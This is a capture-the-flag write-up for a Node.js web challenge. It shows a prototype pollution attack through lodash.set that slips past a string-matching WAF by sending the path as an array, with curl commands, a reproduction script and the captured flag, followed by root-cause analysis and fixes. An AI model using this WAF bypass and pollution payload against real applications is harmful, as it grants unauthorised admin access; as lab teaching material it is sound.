# Spectral_Override — Writeup

- **Category:** Web
- **Difficulty:** Easy
- **Points:** 908
- **Flag format:** `IATCQ{}`
- **Target:** `http://65.1.162.7/` (alt `http://13.233.157.204/`)
- **Flag:** `IATCQ{LF6BWCR2VNU0RIFD7CMM5VQBCO}`

---

## 1. Brief

> The adversary has locked down their internal config API. However they are relying on
> outdated utils. **Pollute the origin and the lies will be inherited.**

Every word of the hint points to **prototype pollution**:

- "outdated utils" → vulnerable `lodash` (`lodash.set` / `lodash.merge`)
- "pollute the origin" → pollute `Object.prototype` (the root of every JS object's prototype chain)
- "the lies will be inherited" → any object lacking the property inherits the injected value (e.g. `isAdmin: true`)

---

## 2. Recon

### 2.1 Front page

`GET /` returns a green "HEX_09 // CYBER_GATEWAY" login page. Key server details:

```
Server: nginx
x-powered-by: Express            <-- Node.js backend
set-cookie: PP_NODE=pp09; ...    <-- sticky session cookie (multiple workers)
```

Requests come back with different `PP_NODE` values (`pp01`, `pp02`, `pp05`, `pp08`, `pp09`).
That is a **load-balanced Node.js cluster with sticky sessions** — critical, because prototype
pollution only affects the memory of **one** Node process. The *pollute* and *read* requests
must land on the same `PP_NODE`, so cookies must be persisted across the whole chain.

Login form posts JSON to `/api/login`. Access hint: *"Guests are welcome to access the system."*

### 2.2 Login as guest

```bash
curl -c cookies.txt -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' \
  http://13.233.157.204/api/login
```

```json
{"success":true,"message":"Login successful","redirect":"/dashboard.html"}
```

Cookies received: `connect.sid` (express-session) and `PP_NODE=pp02` (sticky). Every follow-up
request is sent with `-b cookies.txt` to keep both.

### 2.3 Dashboard

`GET /dashboard.html` reveals two endpoints:

```js
// ---------- protected read ----------
async function getFlag() {
  const res = await fetch('/api/flag');
  ...
}

// ---------- vulnerable write ----------
async function syncConfig() {
  const payload = JSON.parse(document.getElementById('json-input').value);
  await fetch('/api/update', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}
```

Default input:

```json
{ "path": "runtime.theme", "value": "matrix-green" }
```

Success response is **"Configuration merged successfully."** — the wording plus the
`{path, value}` shape strongly implies `lodash.set(config, path, value)` under the hood.

### 2.4 Baseline probes

```
GET  /api/flag
  → 403 {"error":"Access Denied. Global admin privileges required."}

POST /api/update  {"path":"runtime.theme","value":"matrix-green"}
  → 200 {"success":true,"message":"Configuration merged successfully."}
```

So the flag route checks a global admin flag, and `/api/update` writes into an object with a
user-controlled key path. Classic pollution setup.

---

## 3. Exploitation

### 3.1 The pollution attempt (blocked by WAF)

Naïve payload:

```json
{"path":"__proto__.isAdmin","value":true}
```

```json
{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
```

Same for `constructor.prototype.isAdmin` and `a.__proto__.isAdmin`. The WAF is scanning the
**string** `path` for the substrings `__proto__` and `constructor.prototype`.

### 3.2 Bypass — array path

`lodash.set` accepts the path as either a **string** (`"a.b.c"`) or an **array**
(`["a","b","c"]`). The WAF only inspects string paths. Feeding the segments as an array bypasses
it while lodash still walks the same keys:

```json
{"path":["__proto__","isAdmin"],"value":true}
```

Request:

```bash
curl -b cookies.txt -c cookies.txt \
  -H "Content-Type: application/json" \
  -X POST --data-binary @p_array.json \
  http://13.233.157.204/api/update
```

Response:

```json
{"success":true,"message":"Configuration merged successfully."}
```

Internally the server just executed:

```js
_.set(config, ["__proto__", "isAdmin"], true);
// equivalent to: config.__proto__.isAdmin = true;
// equivalent to: Object.prototype.isAdmin = true;
```

Every plain object in **that worker's V8 heap** now inherits `isAdmin === true`.

### 3.3 Collect the flag on the same worker

Because `cookies.txt` still holds `PP_NODE=pp02`, the next request lands on the same polluted
process:

```bash
curl -b cookies.txt http://13.233.157.204/api/flag
```

```json
{"flag":"IATCQ{LF6BWCR2VNU0RIFD7CMM5VQBCO}"}
```

The authorization check on `/api/flag` is presumably something like:

```js
if (req.session.isAdmin || user.isAdmin || config.isAdmin) { return flag; }
```

None of those objects had an own `isAdmin`, so the lookup climbed the prototype chain and hit the
polluted `Object.prototype.isAdmin = true`.

---

## 4. Full reproduction (single script)

```bash
# 1. Login as guest, persist cookies (connect.sid + PP_NODE sticky worker)
curl -sS -c cookies.txt -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' \
  http://13.233.157.204/api/login

# 2. Pollute Object.prototype.isAdmin=true via lodash.set array-path (WAF bypass)
printf '%s' '{"path":["__proto__","isAdmin"],"value":true}' > p.json
curl -sS -b cookies.txt -c cookies.txt \
  -H "Content-Type: application/json" \
  -X POST --data-binary @p.json \
  http://13.233.157.204/api/update

# 3. Read the flag on the same PP_NODE
curl -sS -b cookies.txt http://13.233.157.204/api/flag
# {"flag":"IATCQ{LF6BWCR2VNU0RIFD7CMM5VQBCO}"}
```

---

## 5. Root cause & fix

**Root cause**

1. `/api/update` sinks user JSON directly into `lodash.set(target, req.body.path, req.body.value)`.
2. The WAF only pattern-matches the `path` field when it is a **string**; when `path` is a JSON
   array the same segments slip through.
3. Auth checks read `isAdmin` from ordinary objects, so a poisoned `Object.prototype` silently
   grants admin.

**Fix ideas**

- Update `lodash` to `>= 4.17.21` (patched `_.set` / `_.setWith` / `_.merge` / `_.defaultsDeep`).
- Reject any path segment in `{"__proto__", "constructor", "prototype"}` **after normalizing** to
  an array, regardless of the source type.
- Store config on a prototype-less object (`Object.create(null)`).
- Guard auth flags with `Object.hasOwn(obj, 'isAdmin')` instead of a truthy prototype-chain lookup.

---

## 6. Key takeaways

- A `{path, value}` config endpoint returning "merged" is a lodash-shaped fingerprint — test for
  prototype pollution immediately.
- String-based WAFs on structured input are trivially bypassed by switching the type
  (`"a.b"` → `["a","b"]`).
- With clustered Node + sticky cookies, pollution is per-worker: pin the session and keep every
  request on the same node.
